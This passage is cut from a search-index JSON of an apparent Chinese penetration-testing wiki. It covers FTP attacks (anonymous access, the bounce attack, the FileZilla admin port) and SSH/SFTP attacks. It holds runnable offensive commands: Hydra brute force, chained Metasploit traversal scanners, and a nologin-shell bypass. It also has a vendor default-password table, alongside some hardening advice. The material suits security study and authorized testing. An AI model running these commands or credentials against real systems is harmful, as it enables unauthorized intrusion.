<ip>","title":"\u81ea\u52a8\u5316"},{"location":"Network%20Prot/21%20-%20FTP%E6%B8%97%E9%80%8F/#_7","text":"\u60a8\u53ef\u4ee5\u4f7f\u7528\u6d4f\u89c8\u5668(\u5982Firefox)\u901a\u8fc7\u5982\u4e0bURL\u8fde\u63a5\u5230FTP\u670d\u52a1\u5668: ftp://anonymous:anonymous@10.10.10.98 \u8bf7\u6ce8\u610f\uff0c\u5982\u679c web\u5e94\u7528\u7a0b\u5e8f \u76f4\u63a5\u5411FTP\u670d\u52a1\u5668 \u53d1\u9001\u7528\u6237 \u63a7\u5236\u7684\u6570\u636e \uff0c\u60a8\u53ef\u4ee5\u53d1\u9001\u53ccURL\u7f16\u7801' %0d%0a '(\u5728\u53ccURL\u7f16\u7801\u4e2d\uff0c\u8fd9\u662f' %250d%250a ')\u5b57\u8282\uff0c\u5e76\u4f7f FTP\u670d\u52a1\u5668\u6267\u884c\u4efb\u610f\u64cd\u4f5c\u3002\u5176\u4e2d\u4e00\u79cd\u53ef\u80fd\u7684\u4efb\u610f\u64cd\u4f5c\u662f\u4ece\u7528\u6237\u63a7\u5236\u7684\u670d\u52a1\u5668\u4e0b\u8f7d\u5185\u5bb9\uff0c\u6267\u884c\u7aef\u53e3\u626b\u63cf\u6216\u5c1d\u8bd5\u4e0e\u5176\u4ed6\u57fa\u4e8e\u7eaf\u6587\u672c\u7684\u670d\u52a1(\u5982http)\u901a\u4fe1\u3002","title":"\u6d4f\u89c8\u5668\u8fde\u63a5"},{"location":"Network%20Prot/21%20-%20FTP%E6%B8%97%E9%80%8F/#ftp","text":"wget -m ftp://anonymous:anonymous@10.10.10.98 #\u4e0b\u8f7d\u5168\u90e8 wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98 #\u4e0b\u8f7d\u5168\u90e8","title":"\u4eceFTP\u4e0b\u8f7d\u6240\u6709\u6587\u4ef6"},{"location":"Network%20Prot/21%20-%20FTP%E6%B8%97%E9%80%8F/#ftp_1","text":"USER username PASS password HELP \u670d\u52a1\u5668\u663e\u793a\u652f\u6301\u54ea\u4e9b\u547d\u4ee4 PORT 127,0,0,1,0,80 \u8fd9\u5c06\u6307\u793aFTP\u670d\u52a1\u5668\u4e0e\u7aef\u53e380\u4e2d\u7684IP 127.0.0.1\u5efa\u7acb\u8fde\u63a5( \u60a8\u9700\u8981\u5c06\u7b2c5\u4e2a\u5b57\u7b26\u8bbe\u4e3a\u201c0\u201d\uff0c\u7b2c6\u4e2a\u5b57\u7b26\u8bbe\u4e3a\u5341\u8fdb\u5236\u7aef\u53e3\uff0c\u6216\u8005\u4f7f\u7528\u7b2c5\u548c\u7b2c6\u4e2a\u5b57\u7b26\u8868\u793a\u5341\u516d\u8fdb\u5236\u7aef\u53e3 )\u3002 EPRT |2|127.0.0.1|80| \u8fd9\u5c06\u6307\u793aFTP\u670d\u52a1\u5668\u4e0e\u7aef\u53e380\u4e2d\u7684IP 127.0.0.1\u5efa\u7acbTCP\u8fde\u63a5( \u7531\u201c2\u201d \u8868\u793a)\u3002 \u547d\u4ee4\u652f\u6301IPv6 \u3002 LIST \u8fd9\u5c06\u53d1\u9001\u5f53\u524d\u6587\u4ef6\u5939\u4e2d\u7684\u6587\u4ef6\u5217\u8868 LIST -R \u9012\u5f52\u5217\u51fa\uff08\u5982\u679c\u670d\u52a1\u5668\u5141\u8bb8\uff09 APPE /path/something.txt \u8fd9\u5c06\u663e\u793a FTP \u5c06\u4ece \u88ab\u52a8 \u8fde\u63a5\u6216\u4ece PORT/EPRT \u8fde\u63a5\u63a5\u6536\u5230\u7684\u6570\u636e\u5b58\u50a8\u5230\u6587\u4ef6\u4e2d\u3002\u5982\u679c\u6587\u4ef6\u540d\u5b58\u5728\uff0c\u5b83\u5c06\u8ffd\u52a0\u6570\u636e\u3002 STOR /path/something.txt \u94fe\u63a5 APPE \u4f46\u5b83\u4f1a\u8986\u76d6\u6587\u4ef6 STOU /path/something.txt \u94fe\u63a5 APPE , \u4f46\u5982\u679c\u5b58\u5728\uff0c\u5b83\u4e0d\u4f1a\u505a\u4efb\u4f55\u4e8b\u60c5\u3002 RETR /path/to/file \u5fc5\u987b\u5efa\u7acb\u88ab\u52a8\u6216\u7aef\u53e3\u8fde\u63a5\u3002\u7136\u540e\uff0cFTP \u670d\u52a1\u5668\u5c06\u901a\u8fc7\u8be5\u8fde\u63a5\u53d1\u9001\u6307\u793a\u7684\u6587\u4ef6 REST 6 \u8fd9\u5c06\u6307\u793a\u670d\u52a1\u5668\u4e0b\u6b21\u4f7f\u7528\u5b83\u53d1\u9001 RETR \u5185\u5bb9\u65f6\u5e94\u8be5\u4ece\u7b2c 6 \u4e2a\u5b57\u8282\u5f00\u59cb\u3002 TYPE i \u8bbe\u7f6e\u4f20\u8f93\u4e3a\u4e8c\u8fdb\u5236 PASV \u8fd9\u5c06\u6253\u5f00\u4e00\u4e2a\u88ab\u52a8\u8fde\u63a5\uff0c\u5e76\u6307\u793a\u7528\u6237\u53ef\u4ee5\u8fde\u63a5 PUT /tmp/file.txt \u5c06\u6307\u5b9a\u7684\u6587\u4ef6\u4e0a\u4f20\u5230 FTP [ ]","title":"\u4e00\u4e9bFTP\u547d\u4ee4"},{"location":"Network%20Prot/21%20-%20FTP%E6%B8%97%E9%80%8F/#ftp-attack","text":"\u6709\u4e9bFTP\u670d\u52a1\u5668\u5141\u8bb8\u4f7f\u7528PORT\u547d\u4ee4\u3002\u6b64\u547d\u4ee4\u53ef\u7528\u4e8e\u5411\u670d\u52a1\u5668\u6307\u793a\u60a8\u5e0c\u671b\u901a\u8fc7\u67d0\u4e9b\u7aef\u53e3\u8fde\u63a5\u5230\u5176\u4ed6FTP\u670d\u52a1\u5668\u3002\u7136\u540e\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528\u8be5\u547d\u4ee4\u901a\u8fc7FTP\u670d\u52a1\u5668\u626b\u63cf\u4e3b\u673a\u7684\u54ea\u4e9b\u7aef\u53e3\u662f\u5f00\u653e\u7684\u3002 \u60a8\u8fd8\u53ef\u4ee5\u6ee5\u7528\u6b64\u884c\u4e3a\u4f7f FTP \u670d\u52a1\u5668\u4e0e\u5176\u4ed6\u534f\u8bae\u4ea4\u4e92\u3002\u60a8\u53ef\u4ee5 \u4e0a\u4f20\u4e00\u4e2a\u5305\u542b HTTP \u8bf7\u6c42\u7684\u6587\u4ef6\uff0c \u5e76\u8ba9\u6613\u53d7\u653b\u51fb\u7684 FTP \u670d\u52a1\u5668 \u5c06\u5176\u53d1\u9001\u5230\u4efb\u610f HTTP \u670d\u52a1\u5668 \uff08 \u4e5f\u8bb8\u662f\u4e3a\u4e86\u6dfb\u52a0\u4e00\u4e2a\u65b0\u7684\u7ba1\u7406\u5458\u7528\u6237\uff1f \uff09\uff0c\u6216\u8005\u751a\u81f3\u4e0a\u4f20\u4e00\u4e2a FTP \u8bf7\u6c42\uff0c\u5e76\u8ba9\u6613\u53d7\u653b\u51fb\u7684 FTP \u670d\u52a1\u5668\u4e0b\u8f7d\u4e00\u4e2a\u4e0d\u540c\u7684\u6587\u4ef6FTP\u670d\u52a1\u5668\u3002 \u7406\u8bba\u5f88\u7b80\u5355\uff1a \u5c06\u8bf7\u6c42\uff08\u5728\u6587\u672c\u6587\u4ef6\u4e2d\uff09\u4e0a\u4f20\u5230\u6613\u53d7\u653b\u51fb\u7684\u670d\u52a1\u5668\u3002 \u8bf7\u8bb0\u4f4f\uff0c\u5982\u679c\u60a8\u60f3\u4e0e\u53e6\u4e00\u4e2a HTTP \u6216 FTP \u670d\u52a1\u5668\u901a\u4fe1\uff0c\u60a8\u9700\u8981\u66f4\u6539\u884c 0x0d 0x0a \u7528\u4e8e \u907f\u514d\u53d1\u9001\u60a8\u4e0d\u60f3\u53d1\u9001\u7684\u5b57\u7b26 \uff08\u4e5f\u8bb8\u5c06\u8bf7\u6c42\u4e0a\u4f20\u5230\u60a8\u9700\u8981\u5728\u5f00\u5934\u653e\u7f6e\u4e00\u4e9b\u56fe\u50cf\u6807\u9898\u7684\u6587\u4ef6\u4e2d\uff09 REST X \u7528\u4e8e \u8fde\u63a5\u5230\u4efb\u610f\u670d\u52a1\u5668\u548c\u670d\u52a1 PORT \u7528\u4e8e \u5c06\u4fdd\u5b58\u7684\u8bf7\u6c42\u53d1\u9001\u5230\u670d\u52a1\u5668\u3002 RETR \u8fd9\u5f88\u53ef\u80fd\u4f1a\u5f15\u53d1\u7c7b\u4f3c Socket not writable* \u7684\u9519\u8bef\uff0c\u56e0\u4e3a\u8fde\u63a5\u6301\u7eed\u65f6\u95f4\u4e0d\u8db3\u4ee5\u53d1\u9001\u6570\u636e \u3002\u5c3d\u91cf\u907f\u514d\u7684\u5efa\u8bae\u662f\uff1a RETR \u5982\u679c\u60a8\u8981\u53d1\u9001 HTTP \u8bf7\u6c42\uff0c \u8bf7\u4e00\u4e2a\u63a5\u4e00\u4e2a\u5730\u53d1\u9001\u76f8\u540c\u7684\u8bf7\u6c42\uff0c \u76f4\u5230\u81f3\u5c11**~0.5MB \u5c1d\u8bd5 \u7528\u76f8\u5bf9\u4e8e\u534f\u8bae\u7684\u201c\u5783\u573e\u201d\u6570\u636e\u586b\u5145\u8bf7\u6c42 (\u4e0eFTP\u901a\u4fe1\u53ef\u80fd\u53ea\u662f\u5783\u573e\u547d\u4ee4\u6216\u91cd\u590d' RETR '\u6307\u4ee4\u6765\u83b7\u53d6\u6587\u4ef6) \u7528\u5927\u91cf\u7a7a\u5b57\u7b26\u6216\u5176\u4ed6\u5b57\u7b26\u586b\u5145\u8bf7\u6c42","title":"FTP\u53cd\u5f39 attack"},{"location":"Network%20Prot/21%20-%20FTP%E6%B8%97%E9%80%8F/#filezilla","text":"FileZilla \u901a\u5e38 \u7ed1\u5b9a \u5230 FileZilla-Server \uff08\u7aef\u53e3 14147\uff09\u7684 \u672c\u5730 \u7ba1\u7406\u670d\u52a1 \u3002\u5982\u679c\u60a8\u53ef\u4ee5\u4ece \u60a8\u7684\u673a\u5668\u521b\u5efa\u4e00\u4e2a \u96a7\u9053 \u6765\u8bbf\u95ee\u6b64\u7aef\u53e3\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528 \u7a7a\u767d\u5bc6\u7801 \u8fde\u63a5 *\u5230 \u5b83 \u5e76\u4e3a FTP \u670d\u52a1 \u521b\u5efa \u4e00\u4e2a \u65b0\u7528\u6237**\u3002","title":"Filezilla \u670d\u52a1\u6f0f\u6d1e"},{"location":"Network%20Prot/21%20-%20FTP%E6%B8%97%E9%80%8F/#_8","text":"ftpusers ftp.conf proftpd.conf vsftpd.conf","title":"\u914d\u7f6e\u6587\u4ef6"},{"location":"Network%20Prot/21%20-%20FTP%E6%B8%97%E9%80%8F/#post-exploitation","text":"vsFTPd \u7684\u9ed8\u8ba4\u914d\u7f6e\u53ef\u4ee5\u5728 /etc/vsftpd.conf . \u5728\u8fd9\u91cc\uff0c\u60a8\u53ef\u4ee5\u627e\u5230\u4e00\u4e9b\u5371\u9669\u7684\u8bbe\u7f6e\uff1a anonymous_enable=YES anon_upload_enable=YES anon_mkdir_write_enable=YES anon_root=/home/username/ftp - \u533f\u540d\u76ee\u5f55\u3002 chown_uploads=YES - \u66f4\u6539\u533f\u540d\u4e0a\u4f20\u6587\u4ef6\u7684\u6240\u6709\u6743 chown_username=username - \u83b7\u5f97\u533f\u540d\u4e0a\u4f20\u6587\u4ef6\u6240\u6709\u6743\u7684\u7528\u6237 local_enable=YES - \u5141\u8bb8\u672c\u5730\u7528\u6237\u767b\u5f55 no_anon_password=YES - \u4e0d\u8981\u533f\u540d\u8be2\u95ee\u5bc6\u7801 write_enable=YES - \u5141\u8bb8\u547d\u4ee4\uff1aSTOR\u3001DELE\u3001RNFR\u3001RNTO\u3001MKD\u3001RMD\u3001APPE \u548c SITE","title":"Post-Exploitation"},{"location":"Network%20Prot/21%20-%20FTP%E6%B8%97%E9%80%8F/#shodan","text":"ftp port:21","title":"Shodan"},{"location":"Network%20Prot/21%20-%20FTP%E6%B8%97%E9%80%8F/#_9","text":"Protocol_Name: FTP #\u534f\u8bae\u7f29\u5199(\u5982\u679c\u6709\u7684\u8bdd)\u3002 Port_Number: 21 #\u5982\u679c\u6709\u591a\u4e2a\uff0c\u5219\u7528\u9017\u53f7\u5206\u9694\u3002 Protocol_Description: File Transfer Protocol #\u534f\u8bae\u7f29\u5199 Entry_1: Name: Notes Description: Notes for FTP Note: | Anonymous Login -bi <<< so that your put is done via binary wget --mirror 'ftp://ftp_user:UTDRSCH53c\"$6hys@10.10.10.59' ^^to download all dirs and files wget --no-passive-ftp --mirror 'ftp://anonymous:anonymous@10.10.10.98' if PASV transfer is disabled Entry_2: Name: Banner Grab Description: Grab FTP Banner via telnet Command: telnet -n {IP} 21 Entry_3: Name: Cert Grab Description: Grab FTP Certificate if existing Command: openssl s_client -connect {IP}:21 -starttls ftp Entry_4: Name: nmap ftp Description: Anon login and bounce FTP checks are performed Command: nmap --script ftp-* -p 21 {IP} Entry_5: Name: Browser Connection Description: Connect with Browser Note: ftp://anonymous:anonymous@{IP} Entry_6: Name: Hydra Brute Force Description: Need Username Command: hydra -t 1 -l {Username} -P {Big_Passwordlist} -vV {IP} ftp Entry_7: Name: consolesless mfs enumeration ftp Description: FTP enumeration without the need to run msfconsole Note: sourced from https://github.com/carlospolop/legion Command: msfconsole -q -x 'use auxiliary/scanner/ftp/anonymous; set RHOSTS {IP}; set RPORT 21; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ftp/ftp_version; set RHOSTS {IP}; set RPORT 21; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ftp/bison_ftp_traversal; set RHOSTS {IP}; set RPORT 21; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ftp/colorado_ftp_traversal; set RHOSTS {IP}; set RPORT 21; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ftp/titanftp_xcrc_traversal; set RHOSTS {IP}; set RPORT 21; run; exit'","title":"\u81ea\u52a8\u5316"},{"location":"Network%20Prot/22%20-%20SSH-SFTP%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/","text":"\u57fa\u672c\u4fe1\u606f SSH \u6216 Secure Shell \u6216 Secure Socket Shell \u662f\u4e00\u79cd\u7f51\u7edc\u534f\u8bae\uff0c\u5b83\u4e3a\u7528\u6237\u63d0\u4f9b \u4e86\u4e00\u79cd\u901a\u8fc7\u4e0d\u5b89\u5168\u7f51\u7edc\u8bbf\u95ee\u8ba1\u7b97\u673a\u7684\u5b89\u5168\u65b9\u5f0f\u3002 \u9ed8\u8ba4\u7aef\u53e3: 22 22/tcp open ssh syn-ack SSH \u670d\u52a1: openSSH \u2013 OpenBSD SSH\uff0c\u4ece Windows 10 \u5f00\u59cb\u5728 BSD\u3001Linux \u53d1\u884c\u7248\u548c Windows \u4e2d\u63d0\u4f9b Dropbear \u2013 \u7528\u4e8e\u4f4e\u5185\u5b58\u548c\u5904\u7406\u5668\u8d44\u6e90\u73af\u5883\u7684 SSH \u5b9e\u73b0\uff0c\u5728 OpenWrt \u4e2d\u63d0\u4f9b PuTTY \u2013 Windows \u7684 SSH \u5b9e\u73b0\uff0c\u5ba2\u6237\u7aef\u5e38\u7528\uff0c\u670d\u52a1\u5668\u7aef\u4f7f\u7528\u8f83\u5c11 CopSSH \u2013 Windows \u7684 OpenSSH \u5b9e\u65bd SSH \u5e93\uff08\u5b9e\u73b0\u670d\u52a1\u5668\u7aef\uff09: libssh \u2013 \u591a\u5e73\u53f0 C \u5e93\uff0c\u5728 Python \u3001 Perl \u548c R \u4e2d\u5b9e\u73b0 SSHv2 \u534f\u8bae\u7ed1\u5b9a\uff1b\u5b83\u88ab KDE \u7528\u4e8e sftp\uff0cGitHub \u7528\u4e8e git SSH \u57fa\u7840\u8bbe\u65bd wolfSSH \u2013 \u7528 ANSI C \u7f16\u5199\u7684 SSHv2 \u670d\u52a1\u5668\u5e93\uff0c\u9762\u5411\u5d4c\u5165\u5f0f\u3001RTOS \u548c\u8d44\u6e90\u53d7\u9650\u73af\u5883 Apache MINA SSHD \u2013 Apache SSHD Java \u5e93\u57fa\u4e8e Apache MINA paramiko \u2013 Python SSHv2 \u534f\u8bae\u5e93 \u679a\u4e3e Banner \u6293\u53d6 nc -vn <IP> 22 \u81ea\u52a8 ssh \u5ba1\u8ba1 ssh-audit \u662f\u4e00\u4e2a\u7528\u4e8e ssh \u670d\u52a1\u5668\u548c\u5ba2\u6237\u7aef\u914d\u7f6e\u5ba1\u8ba1\u7684\u5de5\u5177\u3002 https://github.com/jtesta/ssh-audit \u662f\u6765\u81ea https://github.com/arthepsy/ssh-audit/\u7684\u65b0\u5206\u652f \u7279\u5f81\uff1a SSH1\u548cSSH2\u534f\u8bae\u670d\u52a1\u5668\u652f\u6301\uff1b \u5206\u6790 SSH \u5ba2\u6237\u7aef\u914d\u7f6e\uff1b \u6293\u53d6\u6a2a\u5e45\uff0c\u8bc6\u522b\u8bbe\u5907\u6216\u8f6f\u4ef6\u548c\u64cd\u4f5c\u7cfb\u7edf\uff0c\u68c0\u6d4b\u538b\u7f29\uff1b \u6536\u96c6\u5bc6\u94a5\u4ea4\u6362\u3001\u4e3b\u673a\u5bc6\u94a5\u3001\u52a0\u5bc6\u548c\u6d88\u606f\u8ba4\u8bc1\u4ee3\u7801\u7b97\u6cd5\uff1b \u8f93\u51fa\u7b97\u6cd5\u4fe1\u606f\uff08\u81ea\u53ef\u7528\u3001\u5220\u9664/\u7981\u7528\u3001\u4e0d\u5b89\u5168/\u5f31/\u9057\u7559\u7b49\uff09\uff1b \u8f93\u51fa\u7b97\u6cd5\u5efa\u8bae\uff08\u6839\u636e\u8bc6\u522b\u7684\u8f6f\u4ef6\u7248\u672c\u6dfb\u52a0\u6216\u5220\u9664\uff09\uff1b \u8f93\u51fa\u5b89\u5168\u4fe1\u606f\uff08\u76f8\u5173\u95ee\u9898\u3001\u5206\u914d\u7684 CVE \u5217\u8868\u7b49\uff09\uff1b \u6839\u636e\u7b97\u6cd5\u4fe1\u606f\u5206\u6790SSH\u7248\u672c\u517c\u5bb9\u6027\uff1b \u6765\u81ea OpenSSH\u3001Dropbear SSH \u548c libssh \u7684\u5386\u53f2\u4fe1\u606f\uff1b \u5728 Linux \u548c Windows \u4e0a\u8fd0\u884c\uff1b \u6ca1\u6709\u4f9d\u8d56 usage: ssh-audit.py [-1246pbcnjvlt] <host> -1, --ssh1 force ssh version 1 only -2, --ssh2 force ssh version 2 only -4, --ipv4 enable IPv4 (order of precedence) -6, --ipv6 enable IPv6 (order of precedence) -p, --port=<port> port to connect -b, --batch batch output -c, --client-audit starts a server on port 2222 to audit client software config (use -p to change port; use -t to change timeout) -n, --no-colors disable colors -j, --json JSON output -v, --verbose verbose output -l, --level=<level> minimum output level (info|warn|fail) -t, --timeout=<secs> timeout (in seconds) for connection and reading (default: 5) $ python3 ssh-audit <IP> See it in action (Asciinema) \u670d\u52a1\u5668\u7684\u516c\u5171 SSH \u5bc6\u94a5 ssh-keyscan -t rsa <IP> -p <PORT> \u5f31\u5bc6\u7801\u7b97\u6cd5 This is discovered by default by nmap . But you can also use sslcan or sslyze . Nmap \u811a\u672c nmap -p22 <ip> -sC # \u4e3aSSH\u53d1\u9001\u9ed8\u8ba4\u7684nmap\u811a\u672c nmap -p22 <ip> -sV # \u68c0\u7d22\u7248\u672c nmap -p22 <ip> --script ssh2-enum-algos # \u68c0\u7d22\u652f\u6301\u7684\u7b97\u6cd5 nmap -p22 <ip> --script ssh-hostkey --script-args ssh_hostkey=full # \u68c0\u7d22\u5f31\u5bc6\u94a5 nmap -p22 <ip> --script ssh-auth-methods --script-args=\"ssh.user=root\" # \u68c0\u67e5\u8ba4\u8bc1\u65b9\u5f0f Shodan ssh \u66b4\u529b\u7834\u89e3\u7528\u6237\u540d\u3001\u5bc6\u7801\u548c\u79c1\u94a5 \u7528\u6237\u540d\u679a\u4e3e \u5728\u67d0\u4e9b\u7248\u672c\u7684 OpenSSH \u4e2d\uff0c\u60a8\u53ef\u4ee5\u8fdb\u884c\u5b9a\u65f6\u653b\u51fb\u6765\u679a\u4e3e\u7528\u6237\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528 metasploit \u6a21\u5757\u6765\u5229\u7528\u5b83\uff1a msf> use scanner/ssh/ssh_enumusers \u79c1\u94a5/\u516c\u94a5 BF \u5982\u679c\u60a8\u77e5\u9053\u4e00\u4e9b\u53ef\u4ee5\u4f7f\u7528\u7684 ssh \u79c1\u94a5...\u8ba9\u6211\u4eec\u8bd5\u8bd5\u5427\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528 nmap \u811a\u672c\uff1a https://nmap.org/nsedoc/scripts/ssh-publickey-acceptance.html \u6216\u8005 MSF \u8f85\u52a9\u6a21\u5757\uff1a msf> use scanner/ssh/ssh_identify_pubkeys Kerberos \u4f7f\u7528\u8be5\u534f\u8bae\u7684 crackmapexec ssh \u53ef\u4ee5\u4f7f\u7528\u8be5\u9009\u9879 \u901a\u8fc7 kerberos --kerberos \u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002 \u8bf7\u8fd0\u884c\u3002 crackmapexec ssh --help . \u9ed8\u8ba4\u51ed\u8bc1 Vendor Usernames Passwords APC apc, device apc Brocade admin admin123, password, brocade, fibranne Cisco admin, cisco, enable, hsa, pix, pnadmin, ripeop, root, shelladmin admin, Admin123, default, password, secur4u, cisco, Cisco, _Cisco, cisco123, C1sco!23, Cisco123, Cisco1234, TANDBERG, change_it, 12345, ipics, pnadmin, diamond, hsadb, c, cc, attack, blender, changeme Citrix root, nsroot, nsmaint, vdiadmin, kvm, cli, admin C1trix321, nsroot, nsmaint, kaviza, kaviza123, freebsd, public, rootadmin, wanscaler D-Link admin, user private, admin, user Dell root, user1, admin, vkernel, cli calvin, 123456, password, vkernel, Stor@ge!, admin EMC admin, root, sysadmin EMCPMAdm7n, Password#1, Password123#, sysadmin, changeme, emc HP/3Com admin, root, vcx, app, spvar, manage, hpsupport, opc_op admin, password, hpinvent, iMC123, pvadmin, passw0rd, besgroup, vcx, nice, access, config, 3V@rpar, 3V#rpar, procurve, badg3r5, OpC_op, !manage, !admin Huawei admin, root 123456, admin, root, Admin123, Admin@storage, Huawei12#$, HwDec@01, hwosta2.0, HuaWei123, fsp200@HW, huawei123 IBM USERID, admin, manager, mqm, db2inst1, db2fenc1, dausr1, db2admin, iadmin, system, device, ufmcli, customer PASSW0RD, passw0rd, admin, password, Passw8rd, iadmin, apc, 123456, cust0mer Juniper netscreen netscreen NetApp admin netapp123 Oracle root, oracle, oravis, applvis, ilom-admin, ilom-operator, nm2user changeme, ilom-admin, ilom-operator, welcome1, oracle VMware vi-admin, root, hqadmin, vmware, admin vmware, vmw@re, hqadmin, default SSH-\u4e2d\u95f4\u4eba \u5982\u679c\u60a8\u5728\u672c\u5730\u7f51\u7edc\u4e2d\u4f5c\u4e3a\u53d7\u5bb3\u8005\u4f7f\u7528\u7528\u6237\u540d\u548c\u5bc6\u7801\u8fde\u63a5\u5230 SSH \u670d\u52a1\u5668\uff0c\u60a8\u53ef\u4ee5\u5c1d\u8bd5 \u6267\u884c MitM \u653b\u51fb\u4ee5\u7a83\u53d6\u8fd9\u4e9b\u51ed\u636e\uff1a \u653b\u51fb\u8def\u5f84\uff1a \u7528\u6237\u6d41\u91cf\u88ab\u91cd\u5b9a\u5411\u5230\u653b\u51fb\u673a\u5668 \u653b\u51fb\u8005\u76d1\u89c6\u8fde\u63a5\u5230 SSH \u670d\u52a1\u5668\u7684\u5c1d\u8bd5\u5e76\u5c06\u5b83\u4eec\u91cd\u5b9a\u5411\u5230\u5176 SSH \u670d\u52a1\u5668 \u653b\u51fb\u8005\u7684SSH\u670d\u52a1\u5668\u914d\u7f6e\uff0c\u9996\u5148\uff0c\u8bb0\u5f55\u6240\u6709\u8f93\u5165\u7684\u6570\u636e\uff0c\u5305\u62ec\u7528\u6237\u7684\u5bc6\u7801\uff0c\u5176\u6b21\uff0c\u5411\u7528\u6237\u60f3\u8981\u8fde\u63a5\u7684\u5408\u6cd5SSH\u670d\u52a1\u5668\u53d1\u9001\u547d\u4ee4\uff0c\u6267\u884c\u5b83\u4eec\uff0c\u7136\u540e\u5c06\u7ed3\u679c\u8fd4\u56de\u7ed9\u5408\u6cd5\u7528\u6237 * SSH MITM * \u5b8c\u5168\u6309\u7167\u4e0a\u9762\u63cf\u8ff0\u7684\u8fdb\u884c\u64cd\u4f5c\u3002 \u4e3a\u4e86\u6355\u83b7\u6267\u884c\u5b9e\u9645\u7684 MitM\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528 ARP \u6b3a\u9a97\u3001DNS \u6b3a\u9a97\u6280\u672f\u3002 \u914d\u7f6e\u9519\u8bef Root \u767b\u5f55 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5927\u591a\u6570 SSH \u670d\u52a1\u5668\u5b9e\u73b0\u5c06\u5141\u8bb8 root \u767b\u5f55\uff0c\u5efa\u8bae\u7981\u7528\u5b83\uff0c\u56e0\u4e3a\u5982\u679c\u8be5\u5e10\u6237\u7684\u51ed\u636e\u6cc4\u9732\uff0c\u653b\u51fb\u8005\u5c06\u76f4\u63a5\u83b7\u5f97\u7ba1\u7406\u6743\u9650\uff0c\u8fd9\u4e5f\u5c06\u5141\u8bb8\u653b\u51fb\u8005\u5bf9\u8be5\u5e10\u6237\u8fdb\u884c\u66b4\u529b\u653b\u51fb\u3002 \u5982\u4f55\u7981\u7528 openSSH \u7684 root \u767b\u5f55\uff1a \u7f16\u8f91 SSH \u670d\u52a1\u5668\u914d\u7f6e sudoedit /etc/ssh/sshd_config \u6362\u6210 #PermitRootLogin yes _ PermitRootLogin no \u8003\u8651\u66f4\u6539\u914d\u7f6e\uff1a sudo systemctl daemon-reload \u91cd\u65b0\u542f\u52a8 SSH \u670d\u52a1\u5668 sudo systemctl restart sshd SFTP\u547d\u4ee4\u6267\u884c \u53e6\u4e00\u4e2a\u5e38\u89c1\u7684 SSH \u914d\u7f6e\u9519\u8bef\u7ecf\u5e38\u51fa\u73b0\u5728 SFTP \u914d\u7f6e\u4e2d\u3002\u5927\u591a\u6570\u65f6\u5019\uff0c\u5728\u521b\u5efa SFTP \u670d\u52a1\u5668\u65f6\uff0c\u7ba1\u7406\u5458\u5e0c\u671b\u7528\u6237\u5177\u6709 SFTP \u8bbf\u95ee\u6743\u9650\u6765\u5171\u4eab\u6587\u4ef6\uff0c\u800c\u4e0d\u662f\u5728\u673a\u5668\u4e0a\u83b7\u53d6\u8fdc\u7a0b shell\u3002\u6240\u4ee5\u4ed6\u4eec\u8ba4\u4e3a\u521b\u5efa\u4e00\u4e2a\u7528\u6237\uff0c\u7ed9\u4ed6\u4e00\u4e2a\u5360\u4f4d\u7b26 shell\uff08\u6bd4\u5982 /usr/bin/nologin \u6216 /usr/bin/false \uff09\u5e76\u5728\u76d1\u72f1\u4e2d chroot \u5c31\u8db3\u4ee5\u907f\u514d shell \u8bbf\u95ee\u6216\u5bf9\u6574\u4e2a\u6587\u4ef6\u7cfb\u7edf\u7684\u6ee5\u7528\u3002\u4f46\u4ed6\u4eec\u9519\u4e86\uff0c \u7528\u6237\u53ef\u4ee5\u5728\u6267\u884c\u9ed8\u8ba4\u547d\u4ee4\u6216 shell \u4e4b\u524d\u8981\u6c42\u5728\u8eab\u4efd\u9a8c\u8bc1\u540e\u7acb\u5373\u6267\u884c\u547d\u4ee4 \u3002\u56e0\u6b64\uff0c\u8981\u7ed5\u8fc7\u5c06\u62d2\u7edd shell \u8bbf\u95ee\u7684\u5360\u4f4d\u7b26 shell\uff0c\u53ea\u9700\u8981\u6c42\u6267\u884c\u547d\u4ee4\uff08\u4f8b\u5982 /bin/bash \uff09\u4e4b\u524d\uff0c\u53ea\u9700\u6267\u884c\u4ee5\u4e0b\u64cd\u4f5c\uff1a $ ssh -v noraj@192.168.1.94 id ... Password: debug1: Authentication succeeded (keyboard-interactive). Authenticated to 192.168.1.94 ([192.168.1.94]:22). debug1: channel 0: new [client-session] debug1: Requesting no-more-sessions@openssh.com debug1: Entering interactive session. debug1: pledge: network debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0 debug1: Sending command: id debug1: client_input_channel_req: channel 0 rtype exit-status reply 0 debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0 uid=1000(noraj) gid=100(users) groups=100(users) debug1: channel 0: free: client-session, nchannels 1 Transferred: sent 2412, received 2480 bytes, in 0.1 seconds Bytes per second: sent 43133.4, received 44349.5 debug1: Exit status 0 $ ssh noraj@192.168.1.94 /bin/bash /etc/ssh/sshd_config \u4ee5\u4e0b\u662f\u7528\u6237\u7684\u5b89\u5168 SFTP \u914d\u7f6e ( \u2013openSSH)\u793a\u4f8b noraj \uff1a Match User noraj ChrootDirectory %h ForceCommand internal-sftp AllowTcpForwarding no PermitTunnel no X11Forwarding no PermitTTY no \u6b64\u914d\u7f6e\u5c06\u4ec5\u5141\u8bb8 SFTP\uff1a\u901a\u8fc7\u5f3a\u5236\u542f\u52a8\u547d\u4ee4\u548c\u7981\u7528 TTY \u8bbf\u95ee\u6765\u7981\u7528 shell \u8bbf\u95ee\uff0c\u4f46\u4e5f\u7981\u7528\u6240\u6709\u7c7b\u578b\u7684\u7aef\u53e3\u8f6c\u53d1\u6216\u96a7\u9053\u3002 SFTP \u96a7\u9053 \u5982\u679c\u60a8\u6709\u6743\u8bbf\u95ee SFTP 